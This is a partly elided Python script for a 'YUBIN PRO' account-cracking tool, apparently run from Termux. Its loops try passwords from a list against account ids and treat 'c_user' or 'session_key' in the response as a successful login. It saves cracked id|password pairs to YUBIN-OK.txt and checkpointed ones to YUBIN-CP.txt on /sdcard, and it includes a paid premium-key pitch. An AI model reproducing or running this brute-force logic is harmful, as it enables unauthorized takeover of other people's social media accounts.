...
def menu():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                               ...
                               public_mai()                      
                                ...
                                if cpok in ['1','01']:
                                    ...
                                    animation(' >> Opening YUBIN-OK.txt')
                                    print('----------------------------------------------')
                                    time.sleep(1)
                                    with open('/sdcard/YUBIN-OK.txt', 'r') as okids:
                                        okid = okids.read()
                                    ...
                                    os.system('clear')
                                    print(logo)
                                    open('/sdcard/YUBIN-CP.txt', 'a')
                                    animation(' >> Opening YUBIN-CP.txt')
                                    print('----------------------------------------------')
                                    time.sleep(1)
                                    with open('/sdcard/YUBIN-CP.txt', 'r') as cpids:
                                        cpid = cpids.read()
                                        animation('\u001b[33m'+cpid);
                                        cpids.close()
                                    print('\033[1;37m----------------------------------------------')
                        ...
                        tks = ("Hi HARRY Sir, I Need To Buy Your Paid YUBIN PRO Tools Version 2.0.2 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in HARRY:
                                ...
                                print('\r\r\033[1;32m [YUBIN-OK] %s | %s'%(ids,pas))

                                open('/sdcard/YUBIN-OK.txt', 'a').write(ids+'|'+pas+'\n')

                                oks.append(ids)

                                break

                        elif 'checkpoint' in YUBIN:

                                if 'y' in pcp:

                                        print('\r\r\u001b[33m [YUBIN-CP] '+ids+' | '+pas+'\033[1;97m')
                ...
                try:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        print('\r\r\033[1;32m [YUBIN-OK] '+ids+' | '+pas+'\033[1;97m')
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        try:
                                                ...
                                                okk=open('/sdcard/YUBIN-OK.txt','r').read()
